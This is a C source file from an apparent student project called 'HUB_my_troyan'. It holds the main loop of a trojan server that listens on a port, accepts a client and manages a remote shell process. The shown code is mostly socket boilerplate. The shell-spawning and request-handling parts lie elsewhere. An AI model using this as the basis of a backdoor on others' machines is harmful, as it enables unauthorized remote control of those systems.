/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 app_start.c
*/

#include "app.h"

bool loop = true;

void app_stop(void)
{
    loop = false;
}

static int app_loop(server_t *server)
{
    socket_t *client;
    int status = EXIT_SUCCESS;

    write_in_log(1, "Start app\n");
    while (loop) {
        client = (server->client_connected) ? &server->client : NULL;
        if (socket_server_select(&server->select, client, &server->sock)) {
            status = EXIT_FAILURE;
            break;
        }
        if (server->select.status != 0) {
            if (app_process_request(server) == EXIT_FAILURE) {
                break;
            }
        }
    }
    write_in_log(1, "Stop app\n");
    return status;
}

static void app_destroy(server_t *server)
{
    if (server->client_connected) {
        shell_stop(&server->shell);
        socket_close(&server->client);
    }
    socket_close(&server->sock);
}

static int app_init(server_t *server)
{
    server->client_connected = false;
    server->shell.pid = -1;
    server->client.fd = -1;
    if (socket_server_create(&server->sock, PORT, MAX_CLIENT))
        return EXIT_FAILURE;
    if (signal_init() == EXIT_FAILURE)
        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}

int app(void)
{
    server_t server;
    int status = EXIT_SUCCESS;

    if (app_init(&server) == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (app_loop(&server) == EXIT_FAILURE)
        status = EXIT_FAILURE;
    app_destroy(&server);
    return status;
}